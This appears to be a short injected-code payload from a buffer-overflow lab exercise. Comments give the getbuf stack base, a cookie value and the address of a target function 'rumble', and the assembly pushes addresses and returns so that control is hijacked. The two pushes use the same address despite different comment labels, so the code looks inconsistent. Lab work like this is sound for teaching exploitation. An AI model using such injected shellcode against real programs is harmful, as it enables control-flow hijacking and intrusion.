# stack frame base of getbuf is at 0x556836b0 (%ebp)
# Cookie: 0x60f73576
# 08049510 <rumble>
# str start value -0x42(%ebp) : 0x5568 366E
# memcmp *str, 60F73576\0

push $0x08049446 # addr of str
push $0x08049446 # addr of rumble
ret